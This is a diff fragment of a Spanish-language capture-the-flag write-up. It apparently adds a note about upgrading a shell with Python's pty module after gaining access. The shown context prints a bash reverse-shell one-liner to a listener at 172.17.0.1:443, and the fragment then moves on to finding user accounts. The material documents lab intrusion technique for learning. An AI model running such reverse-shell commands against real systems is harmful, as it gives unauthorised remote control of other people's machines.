@@ -73,6 +73,8 @@ bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 
 Y finalmente tendremos acceso a la máquina.
 
+**Nota Post-Write up: Sanitizar: ```python3 -c 'import pty; pty.spawn("/bin/bash")'```** 
+
 ## Paso N6: Preparando herramientas necesarias
 Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que tendremos que buscar acceder a uno de ellos. Obviaremos las técnicas usuales de búsqueda de credenciales ya que ninguna se aplica en esta máquina.
 <img width="485" height="150" alt="image" src="https://github.com/user-attachments/assets/5a23eb8f-6567-4cd0-93db-daf154f8bf49" />
